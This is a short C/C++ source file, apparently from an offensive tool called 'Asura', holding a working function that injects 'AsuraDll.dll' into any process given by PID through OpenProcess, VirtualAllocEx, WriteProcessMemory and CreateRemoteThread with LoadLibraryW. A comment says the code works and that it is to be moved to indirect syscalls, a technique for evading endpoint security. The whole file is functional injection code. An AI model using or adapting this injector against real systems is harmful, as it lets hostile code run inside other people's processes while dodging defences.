#include "asurautils.h"

VOID
dll_injection(
    int PID
){
    //this actually worked, now move all of this shit do indirect syscall, lol
    HANDLE processHandle;
    PVOID remoteBuffer;

    wchar_t dllName[] = L"AsuraDll.dll";
    wchar_t wpath[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, wpath);

    size_t pathsz = wcslen(wpath);
    size_t namesz = wcslen(dllName);

    wchar_t dllPath[MAX_PATH + namesz + 1];

    wcscpy(dllPath, wpath);
    if(dllPath[pathsz - 1] != L'\\'){
        wcscat(dllPath, L"\\");
    }

    wcscat(dllPath, dllName);
    std::wcout << L"Concatenated wide character string: " << dllPath << std::endl;

    printf("Injecting DLL to PID: %i\n", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(PID));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    CloseHandle(processHandle);
    return;
}